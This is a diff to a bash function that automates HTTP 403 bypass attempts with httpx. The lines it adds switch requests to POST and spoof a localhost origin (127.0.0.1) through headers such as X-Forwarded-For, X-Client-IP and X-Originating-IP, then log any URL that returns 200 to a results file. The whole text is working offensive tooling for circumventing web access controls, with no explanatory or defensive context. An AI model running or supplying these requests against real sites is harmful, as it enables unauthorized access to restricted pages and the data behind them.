@@ -8,7 +8,16 @@ function bypass(){
 	echo "$url" | httpx -H  "X-Original-URL: $path"  -mc 200  -retries 2 |tee -a 403_bypass.txt
 	echo "$1"   | httpx -H  "X-Rwrite-URL: $path"    -mc 200  -retries 2 |tee -a 403_bypass.txt
 	echo "$url" | httpx -H  "X-Rwrite-URL: $path"    -mc 200  -retries 2 |tee -a 403_bypass.txt
+	echo "$1"   | httpx -H  "Content-Length: 0" -x Post    -mc 200  -retries 2 |tee -a 403_bypass.txt
+	echo "$1"   | httpx  -x Post    -mc 200  -retries 2 |tee -a 403_bypass.txt
 
+	echo "$url" | httpx -H  "X-Client-IP: 127.0.0.1"      -mc 200  -retries 2 |tee -a 403_bypass.txt
+	echo "$url" | httpx -H  "X-Remote-IP: 127.0.0.1"      -mc 200  -retries 2 |tee -a 403_bypass.txt
+	echo "$url" | httpx -H  "X-Remote-Addr: 127.0.0.1"    -mc 200  -retries 2 |tee -a 403_bypass.txt
+	echo "$url" | httpx -H  "X-Host: 127.0.0.1"           -mc 200  -retries 2 |tee -a 403_bypass.txt
+	echo "$url" | httpx -H  "X-Forwarded-For: 127.0.0.1"  -mc 200  -retries 2 |tee -a 403_bypass.txt
+	echo "$url" | httpx -H  "X-Forwarded-Host: 127.0.0.1" -mc 200  -retries 2 |tee -a 403_bypass.txt
+	echo "$url" | httpx -H  "X-Originating-IP: 127.0.0.1"  -mc 200  -retries 2 |tee -a 403_bypass.txt
 
 }
 
